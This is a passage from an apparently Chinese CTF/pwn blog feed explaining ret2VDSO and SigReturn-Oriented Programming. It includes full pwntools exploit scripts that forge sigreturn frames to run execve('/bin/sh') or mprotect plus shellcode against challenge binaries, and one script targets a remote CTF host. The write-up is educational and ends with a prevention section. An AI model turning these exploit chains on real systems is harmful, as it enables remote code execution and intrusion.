process(&#39;./main&#39;)#gdb.attach(p)vdso_addr = 0xf7fd8000print &#39;Try vdso %s&#39; % hex(vdso_addr)payload = &#39;A&#39; * 0x110frame = SigreturnFrame(kernel=&quot;i386&quot;)frame.eax = constants.SYS_execveframe.ebx = bin_sh_addrframe.eip = vdso_addr + 0xb76 # address of int 0x80frame.esp = bss_addrframe.ebp = bss_addrframe.gs = 0x63frame.cs = 0x23frame.es = 0x2bframe.ds = 0x2bframe.ss = 0x2bret_addr = vdso_addr + 0xb71 # address of sigreturnpayload += p32(ret_addr) + str(frame)p.recvuntil(&#39;&gt; &#39;)p.sendline(payload)p.sendline(&#39;echo pwned&#39;)data = p.recvuntil(&#39;pwned&#39;)if data != &#39;pwned&#39;:    raise Exception, &#39;Failed&#39;p.interactive()</code></pre><p>打开 ASLR 之后对 VDSO 进行爆破（32 位是 $\frac{1}{256}$ 的概率）：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *bin_sh_addr = 0x804a020bss_addr = 0x804a030vdso_range = range(0xf7600000, 0xf7700000, 0x1000)def bruteforce():    global p    context.arch = &#39;i386&#39;    p = process(&#39;./main&#39;)    global vdso_addr    vdso_addr = random.choice(vdso_range)    print &#39;Try vdso %s&#39; % hex(vdso_addr)    payload = &#39;A&#39; * 0x110    frame = SigreturnFrame(kernel=&quot;i386&quot;)    frame.eax = constants.SYS_execve    frame.ebx = bin_sh_addr    frame.eip = vdso_addr + 0xb76 # address of int 0x80    frame.esp = bss_addr    frame.ebp = bss_addr    frame.gs = 0x63    frame.cs = 0x23    frame.es = 0x2b    frame.ds = 0x2b    frame.ss = 0x2b    ret_addr = vdso_addr + 0xb71 # address of sigreturn    payload += p32(ret_addr) + str(frame)    p.recvuntil(&#39;&gt; &#39;)    p.send(payload)    p.sendline(&#39;echo pwned&#39;)    data = p.recvuntil(&#39;pwned&#39;)    if data != &#39;pwned&#39;:        info(&#39;Failed&#39;)    returnif __name__ == &#39;__main__&#39;:    global p, vdso_addr    i = 1    while True:        print &#39;Try %d&#39; % i        try:            bruteforce()        except Exception as e:            info(&#39;Wrong VDSO&#39;)            p.close()            i += 1            continue        info(&#39;vdso_addr = &#39; + hex(vdso_addr))        break    p.interactive()</code></pre><h1 id="Example-x64"><a href="#Example-x64" class="headerlink" title="Example_x64"></a>Example_x64</h1><p>64 位下使用 AXUV 泄漏 VDSO 的例子。主要是输入一串长为 1024 的字符串：</p><pre><code class="nasm">section .textglobal _startjmp _startvuln:sub rsp, 8mov rax, 0 ; sys_readxor rdi, rdimov rsi, rspmov rdx, 1024syscalladd rsp, 8ret_start:call vulnmov rax, 60 ; sys_exitxor rdi, rdisyscallgadgets:mov rdi, 1retmov rax, 15retsyscallret</code></pre><p>尝试利用 vsyscall 中的 <code>syscall ; ret</code> 没能成功，所以在程序后面又加了一个 Gadget 用来构造（具体什么原因没有找到）。在栈上泄漏 AUXV 之后，可以获取 VDSO 的基址以及输入的字符串在栈上的地址。脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./main&#39;)# id&#39;s of Auxillary VectorsAT_SYSINFO_EHDR = 0x21AT_HWCAP = 0x10AT_PAGESZ = 0x06AT_CLKTCK = 0x11AT_PHDR = 0x03AT_PHENT = 0x04AT_PHNUM = 0x05AT_BASE = 0x07AT_FLAGS = 0x08AT_ENTRY = 0x09AT_UID = 0x0bAT_EUID = 0x0cAT_GID = 0x0dAT_EGID = 0x0eAT_SECURE = 0x17AT_RANDOM = 0x19AT_EXECFN = 0x1fAT_PLATFORM = 0x0fgdb.attach(p)vuln_addr = 0x400082set_write = 0x4000acsyscall_addr = 0x400096set_sigreturn = 0x4000b2payload = &#39;/bin/sh\x00&#39;payload += p64(vuln_addr)payload += p64(set_write)payload += p64(syscall_addr)payload += &#39;A&#39; * 8payload += p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)payload = &#39;A&#39;raw_input(&#39;@&#39;)p.send(payload)ENV_AUX_VEC = p.recv(1024)QWORD_LIST = []for i in range(0, len(ENV_AUX_VEC), 8):    QWORD_LIST.append(u64(ENV_AUX_VEC[i:i + 8]))start_aux_vec = QWORD_LIST.index(AT_SYSINFO_EHDR) # 计算AUXV的起始地址info(hex(start_aux_vec))AUX_VEC_ENTRIES = QWORD_LIST[start_aux_vec: start_aux_vec + (18 * 2)] # size of auxillary tableAUX_VEC_ENTRIES = dict(AUX_VEC_ENTRIES[i:i + 2] for i in range(0, len(AUX_VEC_ENTRIES), 2))vdso_addr = AUX_VEC_ENTRIES[AT_SYSINFO_EHDR]info(&quot;vdso_addr = &quot; + hex(vdso_addr))bin_sh_addr = AUX_VEC_ENTRIES[AT_RANDOM] - 0x379 # 获取“/bin/sh”地址info(&quot;bin_sh_addr = &quot; + hex(bin_sh_addr))syscall_ret = 0xffffffffff600007syscall_ret = 0x4000b8frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_addrpayload = &#39;A&#39; * 8 + p64(set_sigreturn) + p64(syscall_ret) + str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="fuckup"><a href="#fuckup" class="headerlink" title="fuckup"></a>fuckup</h1><p>2015 Defcon Quals 中这道题可以使用 ret2VDSO 和 SROP。具体没能复现出来，主要理解一下思想。</p><pre><code class="bash">$ checksec ./fuckup[*] &#39;/home/beale/Desktop/2015-Defcon-Quals-fuckup/fuckup&#39;    Arch:     i386-32-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>总共有五个选项，选项 2 会修改程序段和栈的基址，并重新指向新的地址；选项 3 会告诉我们当前的随机数并再次随机化程序段；选项 4 中可以进行溢出：</p><pre><code class="bash">$ ./fuckupWelcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.This app is to help prove the benefits of F.U.C.K.U.P.Main Menu---------1. Display info2. Change random3. View state info4. Test stack smash-------0. Quit</code></pre><p>在选项 2 的代码反编译后可以看到，每次用户执行命令时，程序会根据类似于 WELL512 的生成算法生成的随机数，改变二进制映射的存储器的基址：</p><pre><code class="cpp">int sub_80481A6(){  ...  do  {    seed_1 = WELL512() * 4294967295.0;    seed_2 = (signed __int64)seed_1;    addy = (void *)(seed_2 &amp; 0xFFFFF000);    actual = my_mmap(seed_2 &amp; 0xFFFFF000, 28672, 3, 34, -1, 0, v0, v0);  }  while ( (seed_2 &amp; 0xFFFFF000) != actual );  qmemcpy(addy, dword_804EB40, 0x7000u);  my_mprotect(addy, 0x4000u, 5);  ...}</code></pre><p>普通的思路肯定是做不了的。使用 VDSO 的思路大致如下：</p><ul><li>因为 32 位下 VDSO 只有 1 字节是随机的，可以暴力破解</li><li>直接溢出改返回地址，但只有 100 个字节<ul><li>首先先利用 VDSO 的 Gadget 做出 sys_read 并加大输入的大小</li><li>将读入的内容放到 TLS（TLS 的位置在 VDSO 前一页）</li><li>使用 sysenter 将栈转移到 TLS 段</li><li>在第二次输入的时候将 /bin/sh 放到 TLS 段（这个时候栈已经搬到 TLS 了）</li></ul></li><li>接着把 Sigreturn Gadget 以及 Fake Signal Frame 一并放进，然后可以直接 execve 执行 /bin/sh</li><li>循环直到成功 get shell</li></ul><p>还可以通过 z3 对伪随机数进行预测，脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *from z3 import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;state = [BitVec(&quot;a1_{0}&quot;.format(i), 32) for i in range(16)]def m(x):    return p32(x + offset)def well512(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ ((a &lt;&lt; 16) &amp; 0xffffffff) ^ ((c &lt;&lt; 15) &amp; 0xffffffff)    c = state[(index+9) &amp; 15]    c ^= (c &gt;&gt; 11)    state[(index+10) &amp; 15] = c ^ b    a = state[idx]    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    state[idx] = a ^ b ^ d ^ ((a &lt;&lt; 2) &amp; 0xffffffff) ^ (        (b &lt;&lt; 18) &amp; 0xffffffff) ^ ((c &lt;&lt; 28) &amp; 0xffffffff)    return idxdef well512_z3(index):    idx = (index+15) &amp; 15    a = state[index]    c = state[(index+13) &amp; 15]    b = a ^ c ^ (a &lt;&lt; 16) ^ (c &lt;&lt; 15)    c = state[(index+9) &amp; 15]    c ^= LShR(c, 11)    a = state[idx]    state[(index+10) &amp; 15] = b ^ c    d = ((32 * (c ^ b)) &amp; 0xDA442D24) ^ c ^ b    a = state[idx]    state[idx] = a ^ b ^ d ^ (a &lt;&lt; 2) ^ (b &lt;&lt; 18) ^ (c &lt;&lt; 28)    return idxdef find_state(recv):    info(&#39;Start find state.&#39;)    global state    z = Solver()    idx = 15    for r in recv:        idx = well512_z3(idx)        z.add(state[idx] == r + 1)    return zp = process(&#39;./fuckup&#39;)def choice(c):    p.recvuntil(&#39;Quit\n&#39;)    p.sendline(str(c))r_list = []for i in range(15):    choice(3)    sleep(0.1)    r = int(p.recv(0x20)[0x11:0x19], 16)    r_list.append(r)info(r_list)z = find_state(r_list)info(&#39;Solver result =&gt; &#39; + str(z.check()))next_state = dict()model = z.model()for i in model:    idx = int(str(i)[3:])    val = model[i].as_long()    next_state[idx] = valinfo(next_state)for i in range(16):    if i in next_state:        state[i] = next_state[i]idx = 15for i in range(15):    idx = well512(idx)idx = well512(idx)predict_val = state[idx] - 1info(&#39;predict_val = &#39; + hex(predict_val))current_base = 0xfffff000 &amp; predict_valinfo(&#39;current_base = &#39; + hex(current_base))base = 0x8048000offset = current_base - base# 0x0804908f : pop eax ; pop ebx ; pop esi ; retpop_eax_ebx_esi_ret = 0x0804908f# 0x0804961a : pop edx ; pop ecx ; pop ebx ; retpop_edx_ecx_ebx_ret = 0x0804961a# 0x0804875f : int 0x80int_0x80 = 0x0804875fpayload = &#39;A&#39; * 0x16payload += m(pop_eax_ebx_esi_ret)payload += p32(0x7D)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x7)payload += p32(0x1000)payload += p32(current_base)payload += m(int_0x80)payload += m(pop_eax_ebx_esi_ret)payload += p32(0x3)payload += p32(0)payload += p32(0)payload += m(pop_edx_ecx_ebx_ret)payload += p32(0x100)payload += p32(current_base)payload += p32(0)payload += m(int_0x80)payload += p32(current_base)payload = payload.ljust(100, &#39;A&#39;)payload += asm(shellcraft.sh())p.sendline(&#39;4&#39;)p.sendline(payload)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#ret2vdso</a><br><a href="http://adam8157.info/blog/2011/10/linux-vdso/" target="_blank" rel="noopener">http://adam8157.info/blog/2011/10/linux-vdso/</a><br><a href="https://bestwing.me/stack-overflow-three-SROP.html" target="_blank" rel="noopener">https://bestwing.me/stack-overflow-three-SROP.html</a><br><a href="https://www.anquanke.com/post/id/85810" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85810</a><br><a href="https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/" target="_blank" rel="noopener">https://binlep.github.io/2020/03/03/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93%20--%20Advanced%20ROP/</a><br><a href="https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html" target="_blank" rel="noopener">https://www.voidsecurity.in/2014/12/return-to-vdso-using-elf-auxiliary.html</a><br><a href="https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/" target="_blank" rel="noopener">https://vvl.me/2019/06/linux-syscall-and-vsyscall-vdso-in-x86/</a><br><a href="https://pwnexpoit.tistory.com/13" target="_blank" rel="noopener">https://pwnexpoit.tistory.com/13</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;用 SROP 的时候，一般情况下很难找得到 &lt;code&gt;syscall ; ret&lt;/code&gt;，这时就需要在 VDSO 中找了。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Understanding SigReturn-Oriented-Programming</title>
    <link href="blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/"/>
    <id>blog.b3ale.cn/2020/03/13/Understanding-SigReturn-Oriented-Programming/</id>
    <published>2020-03-13T08:07:27.000Z</published>
    <updated>2020-03-19T15:53:21.513Z</updated>
    
    <content type="html"><![CDATA[<p>去年学 ROP 的时候遗漏的一个技术。</p><a id="more"></a><h1 id="What-is-SROP"><a href="#What-is-SROP" class="headerlink" title="What is SROP"></a>What is SROP</h1><p>SROP（Sigreturn Oriented Programming）于 2014 年被 Vrije Universiteit Amsterdam 的 Erik Bosman 提出，其相关研究 Framing Signals — A Return to Portable Shellcode 发表在安全顶级会议 Oakland 2014 上，被评选为当年的 Best Student Papers。</p><p>其中，Sigreturn 是一个系统调用，在类 Unix 系统发生 Signal 的时候会被间接地调用。</p><h2 id="Signal"><a href="#Signal" class="headerlink" title="Signal"></a>Signal</h2><p>Signal 机制是类 Unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/1.png" srcset="/img/loading.gif" alt></p><ol><li>首先内核向某个用户态进程发送 Signal 时，该进程会被暂时挂起并进入内核态；</li><li>内核会为该进程保存上下文（类似于保存函数现场，将所有寄存器压入栈，以及压入 Signal 的信息和指向 Sigreturn 的系统调用地址），存储完毕后，回到用户态；</li><li>接着使用用户态中注册过的 Signal Handler 处理相应的 Signal；</li><li>处理完毕后回到内核态，内核执行 Sigreturn 系统调用（32 位的调用号为 77，64 位的调用号为 15），将对应进程的上下文恢复，最后回到用户态。</li></ol><p>在保存进程上下文的时候，用户态的栈中的结构如下。其中 ucontext 以及 siginfo 这一段被称为 Signal Frame，在 Signal Handler 执行完之后，就会执行 Sigreturn 代码：</p><p><img src="/pics/Understanding-SigReturn-Oriented-Programming/2.png" srcset="/img/loading.gif" alt></p><p>Signal Frame 在不同架构下不同。在 x86 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u16                gs, __gsh;    __u16                fs, __fsh;    __u16                es, __esh;    __u16                ds, __dsh;    __u32                edi;    __u32                esi;    __u32                ebp;    __u32                esp;    __u32                ebx;    __u32                edx;    __u32                ecx;    __u32                eax;    __u32                trapno;    __u32                err;    __u32                eip;    __u16                cs, __csh;    __u32                eflags;    __u32                esp_at_signal;    __u16                ss, __ssh;    struct _fpstate __user        *fpstate; // FPU寄存器状态    __u32                oldmask;    __u32                cr2;};</code></pre><p>在 x64 中的 sigcontext 结构体如下：</p><pre><code class="cpp">struct sigcontext {    __u64                r8;    __u64                r9;    __u64                r10;    __u64                r11;    __u64                r12;    __u64                r13;    __u64                r14;    __u64                r15;    __u64                rdi;    __u64                rsi;    __u64                rbp;    __u64                rbx;    __u64                rdx;    __u64                rax;    __u64                rcx;    __u64                rsp;    __u64                rip;    __u64                eflags;        /* RFLAGS */    __u16                cs;    __u16                gs;    __u16                fs;    __u16                __pad0;    __u64                err;    __u64                trapno;    __u64                oldmask;    __u64                cr2;    struct _fpstate __user        *fpstate;    /* Zero when no FPU context */    __u64                reserved1[8];};</code></pre><h2 id="SROP-Theory"><a href="#SROP-Theory" class="headerlink" title="SROP Theory"></a>SROP Theory</h2><p>在 Signal 机制的整个过程中，内核所做的主要工作就是为进程保存上下文以及恢复上下文。所改变的 Signal Frame 是处在用户的地址空间中的，所以可以得出一下结论：</p><ul><li>Signal Frame 可以被用户读写；</li><li>因为内核没有直接参与 Signal，所以内核并不知道保存的 Signal Frame 是否是真正的进程上下文（即执行 Sigreturn 的时候）。</li></ul><p>那么就可以构造出假的 Signal Frame，提前把 RDI、RSI、RIP 等寄存器的值放在构造的结构体中，执行完 Sigreturn 后就会给各个寄存器设置好值。构造 SROP 的条件如下：</p><ul><li>可以通过栈溢出来控制栈</li><li>需要知道一些地址<ul><li><code>&amp;&quot;/bin/sh&quot;</code></li><li>Signal Frame</li><li>Gadget：<code>syscall ; ret</code></li><li>Sigreturn</li></ul></li><li>需要有足够大的空间来放下 Signal Frame</li></ul><p>在 pwntools 中也集成了 SROP 的工具，即 <code>SigreturnFrame()</code>，用于构造假的 sigcontext 结构体（Signal Frame）。</p><h1 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h1><p>我们可以自行构造一个程序，使用 SROP 进行一个简单的利用：</p><pre><code class="cpp">char buf[0x200];int main(){    asm(        // 读取 0x200 字节        &quot;mov rax, 0\n&quot; // sys_read        &quot;mov rdi, 0\n&quot; // fd        &quot;lea rsi, %0\n&quot; // buf        &quot;mov rdx, 0x200\n&quot; // count        &quot;syscall\n&quot;        // 恢复进程上下文        &quot;mov rax, 15\n&quot; // sys_rt_sigaction        &quot;mov rdi, 0\n&quot;        &quot;mov rsp, rsi\n&quot; // 把buf作为栈        // syscall 的 symbol，便于查找        &quot;syscall:\n&quot;        &quot;syscall\n&quot;        &quot;jmp exit\n&quot;        // 退出程序        &quot;exit:\n&quot;        &quot;mov rax, 60\n&quot; // sys_exit        &quot;mov rdi, 0\n&quot;        &quot;syscall\n&quot;        :        : &quot;m&quot; (buf)        :        );}</code></pre><p>构造出 Signal Frame，并在 buf 上设置好字符串，发送 payload 后拿到 shell：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;p = process(&#39;./main&#39;)elf = ELF(&#39;./main&#39;)#gdb.attach(p)# 构造假的Signal Frameframe = SigreturnFrame()frame.rax = constants.SYS_execve # 设置系统调用号为sys_execveframe.rdi = elf.symbols[&#39;buf&#39;] + 0x100 # 设置第一个参数为偏移0x100处的“/bin/sh”字符串frame.rsi = 0frame.rdx = 0frame.rip = elf.symbols[&#39;syscall&#39;]payload = str(frame).ljust(0x100, &#39;A&#39;) + &#39;/bin/sh\x00&#39; # 设置payloadp.send(payload)p.interactive()</code></pre><p>调试的时候可以看到 Sigreturn 后各个寄存器被设置的值，然后就能调用 execve 的系统调用了：</p><pre><code class="gdb">──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────rt_sigreturn()───────────────────────────────── SROP info ──────────────────────────────────       ss_size:0x0000000000000000           rsi:0x0000000000000000           rax:0x000000000000003b           rbp:0x0000000000000000        eflags:0x0000000000000000           rcx:0x0000000000000000           rip:0x000000000040011b           r13:0x0000000000000000           cr2:0x0000000000000000           r12:0x0000000000000000           rbx:0x0000000000000000       uc_link:0x0000000000000000           err:0x0000000000000000        trapno:0x0000000000000000           r10:0x0000000000000000      ss_flags:0x0000000000000000         ss_sp:0x0000000000000000           rdi:0x0000000000600280      uc_flags:0x0000000000000000           r14:0x0000000000000000            r8:0x0000000000000000      selector:0x0000000000000033            r9:0x0000000000000000           rdx:0x0000000000000000           rsp:0x0000000000000000       oldmask:0x0000000000000000           r11:0x0000000000000000           r15:0x0000000000000000...──────────────────────────────────── Code ────────────────────────────────────   0x40010a &lt;main+34&gt;:    mov    rax,0xf   0x400111 &lt;main+41&gt;:    mov    rdi,0x0   0x400118 &lt;main+48&gt;:    mov    rsp,rsi=&gt; 0x40011b &lt;main+51&gt;:    syscall   0x40011d &lt;main+53&gt;:    jmp    0x40011f &lt;main+55&gt;   0x40011f &lt;main+55&gt;:    mov    rax,0x3c   0x400126 &lt;main+62&gt;:    mov    rdi,0x0   0x40012d &lt;main+69&gt;:    syscall────────────────────────────── System call info ──────────────────────────────execve(const char *name = 0x600280,const char *const *argv = 0x0,const char *const *envp = 0x0)const char *name : 0x600280 --&gt; 0x68732f6e69622f (&#39;/bin/sh&#39;)const char *const *argv : 0x0const char *const *envp : 0x0</code></pre><h1 id="Smallest"><a href="#Smallest" class="headerlink" title="Smallest"></a>Smallest</h1><p>程序只开了 NX，Got 表可写、没有 Canary 保护、没开 PIE：</p><pre><code class="bash">$ checksec ./smallest[*] &#39;/home/beale/SROP/2017-360Chunqiu-Smallest/smallest&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>2017 年 360 春秋杯的 Smallest 可以用 SROP 实现利用。程序由汇编实现，整体只有几条语句：</p><pre><code class="bash">$ objdump -d ./smallest -M intel./smallest:     file format elf64-x86-64Disassembly of section .text:00000000004000b0 &lt;.text&gt;:  4000b0:    48 31 c0                 xor    rax,rax  4000b3:    ba 00 04 00 00           mov    edx,0x400  4000b8:    48 89 e6                 mov    rsi,rsp  4000bb:    48 89 c7                 mov    rdi,rax  4000be:    0f 05                    syscall  4000c0:    c3                       ret</code></pre><p>可以看到 <code>4000be</code> 处的是 <code>syscall ; ret</code>，可以作为利用。而整个程序，是实现了一个 read 的系统调用，总共读 0x400 个字节到栈上。利用方法是先泄露出一个栈上的地址，然后通过 SROP 构造一个 read 调用往这个已知的地址上写数据，并再次利用 SROP 构造一个 execve 的调用；第二种方法是使用 mprotect 将不可执行的栈改为 rwx，然后执行 shellcode。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env python#-*- encoding=utf-8 -*-from pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]p = process(&#39;./smallest&#39;)elf = ELF(&#39;./smallest&#39;)#gdb.attach(p)main_addr = 0x4000b0syscall_addr = 0x4000bepayload = p64(main_addr) * 3 # 栈上放3个main的地址，第1个main用来修改rax，第2个main用来泄漏栈，第3个main为了之后的输入raw_input(&#39;@main*3&#39;)p.send(payload)payload = &#39;\xb3&#39; # 修改第2个main的地址为0x4000b3，同时可以将rax和rdi设置为1，可以泄漏栈的地址raw_input(&#39;@leak stack&#39;)p.send(payload)p.recv(8)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_read # sys_read的调用号frame.rdi = 0frame.rsi = stack_addrframe.rdx = 0x400frame.rsp = stack_addrframe.rip = syscall_addrpayload += str(frame) # 读0x400个字节到新的栈上，并把栈搬到新的栈上raw_input(&#39;@fake sigcontext to pivot stack&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)# 下面开始往新的栈上写东西bin_sh_addr = stack_addr + 2 * 8 + len(SigreturnFrame()) # 设置“/bin/sh”字符串的地址payload = p64(main_addr) + p64(syscall_addr) # main为了之后的输入，syscall_ret用来调用sigreturnframe = SigreturnFrame()frame.rax = constants.SYS_execve # sys_execve的调用号frame.rdi = bin_sh_addrframe.rip = syscall_addrpayload += str(frame) + &#39;/bin/sh\x00&#39; # 开shellraw_input(&#39;@fake sigcontext to exec shell&#39;)p.send(payload)payload = p64(syscall_addr).ljust(15, &#39;A&#39;) # 将rax设置成15，并把返回地址设为syscall_ret（覆盖上面的syscall_ret以及部分frame中的flags）raw_input(&#39;@set rax=15&#39;)p.send(payload)p.interactive()</code></pre><p>第二种方法即在新的栈上写东西时构造出 mprotect 的调用，并添加 shellcode：</p><pre><code class="python">payload = p64(main_addr) + p64(syscall_addr)frame = SigreturnFrame()frame.rax = constants.SYS_mprotectframe.rdi = stack_addr &amp; 0xfffffffffffff000frame.rsi = 0x1000frame.rdx = 0x7frame.rsp = stack_addr + 0x108 # 设置栈的位置frame.rip = syscall_addrpayload += str(frame)payload += p64(stack_addr + 0x110) # 设置return的地址payload += asm(shellcraft.sh())p.send(payload)</code></pre><h1 id="ciscn-2019-s-3"><a href="#ciscn-2019-s-3" class="headerlink" title="ciscn_2019_s_3"></a>ciscn_2019_s_3</h1><p>保护和上面开的一样：</p><pre><code class="bash">$ checksec ./ciscn_s_3[*] &#39;/root/tmp/ciscn_2019_s_3/ciscn_s_3&#39;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><h2 id="Analysis-1"><a href="#Analysis-1" class="headerlink" title="Analysis"></a>Analysis</h2><p>程序在 main 中调用了 vuln：</p><pre><code class="asm">000000000040051d &lt;main&gt;:  40051d:    55                       push   rbp  40051e:    48 89 e5                 mov    rbp,rsp  400521:    48 83 ec 10              sub    rsp,0x10  400525:    89 7d fc                 mov    DWORD PTR [rbp-0x4],edi  400528:    48 89 75 f0              mov    QWORD PTR [rbp-0x10],rsi  40052c:    b8 00 00 00 00           mov    eax,0x0  400531:    e8 b7 ff ff ff           call   4004ed &lt;vuln&gt;  400536:    90                       nop  400537:    c9                       leave  400538:    c3                       ret</code></pre><p>vuln 中读了 0x400 到 <code>[rsp-0x10]</code> 处，并输出 0x30 个字节。读了这么多有足够的空间进行 SROP：</p><pre><code class="asm">00000000004004ed &lt;vuln&gt;:  4004ed:    55                       push   rbp  4004ee:    48 89 e5                 mov    rbp,rsp  4004f1:    48 31 c0                 xor    rax,rax  4004f4:    ba 00 04 00 00           mov    edx,0x400  4004f9:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  4004fe:    48 89 c7                 mov    rdi,rax  400501:    0f 05                    syscall  400503:    48 c7 c0 01 00 00 00     mov    rax,0x1  40050a:    ba 30 00 00 00           mov    edx,0x30  40050f:    48 8d 74 24 f0           lea    rsi,[rsp-0x10]  400514:    48 89 c7                 mov    rdi,rax  400517:    0f 05                    syscall  400519:    c3                       ret  40051a:    90                       nop  40051b:    5d                       pop    rbp  40051c:    c3                       ret</code></pre><p>另外还提供了 sys_execve 和 sys_sigreturn 的调用号：</p><pre><code class="asm">00000000004004d6 &lt;gadgets&gt;:  4004d6:    55                       push   rbp  4004d7:    48 89 e5                 mov    rbp,rsp  4004da:    48 c7 c0 0f 00 00 00     mov    rax,0xf  4004e1:    c3                       ret  4004e2:    48 c7 c0 3b 00 00 00     mov    rax,0x3b  4004e9:    c3                       ret  4004ea:    90                       nop  4004eb:    5d                       pop    rbp  4004ec:    c3                       ret</code></pre><p>这题相对简单一些，可以写 <code>&quot;/bin/sh&quot;</code> 到栈上，然后通过 write 的输出计算出地址，最后直接调 SROP。</p><h2 id="Exploit-1"><a href="#Exploit-1" class="headerlink" title="Exploit"></a>Exploit</h2><p>脚本如下：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;context.log_level = &#39;debug&#39;#context.terminal = [&#39;lxterminal&#39;, &#39;-e&#39;]local = 0if local:  p = process(&#39;./ciscn_s_3&#39;)else:    p = remote(&#39;node3.buuoj.cn&#39;, 28526)#gdb.attach(p)vuln_addr = 0x4004f1set_sigreturn_addr = 0x4004daset_execve_addr = 0x4004e2syscall_ret = 0x400517payload = &#39;/bin/sh\x00&#39;.ljust(16, &#39;A&#39;) + p64(vuln_addr)raw_input(&#39;@&#39;)p.send(payload)p.recv(32)stack_addr = u64(p.recv(8))info(&#39;stack_addr = &#39; + hex(stack_addr))bin_sh_addr = stack_addr - 0x118payload = p64(set_sigreturn_addr) + p64(syscall_ret)frame = SigreturnFrame()frame.rax = constants.SYS_execveframe.rdi = bin_sh_addrframe.rip = syscall_retpayload += str(frame)raw_input(&#39;@&#39;)p.send(payload)p.interactive()</code></pre><h1 id="Prevention"><a href="#Prevention" class="headerlink" title="Prevention"></a>Prevention</h1><h2 id="Gadgets-Prevention"><a href="#Gadgets-Prevention" class="headerlink" title="Gadgets Prevention"></a>Gadgets Prevention</h2><p>在当前的几种不同的操作系统中，<code>sigreturn</code> 和 <code>syscall; ret</code> 这两个 Gadgets 非常容易被找到，特别是在 <code>vsyscall</code> 这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让 ASLR 等保护机制物尽其用，使得攻击者很难找到这些 Gadgets。但是这种方法并不能从本质上解决 SROP 的问题。</p><h2 id="Signal-Frame-Canaries"><a href="#Signal-Frame-Canaries" class="headerlink" title="Signal Frame Canaries"></a>Signal Frame Canaries</h2><p>这种方法借鉴于 Stack Canaries 机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生 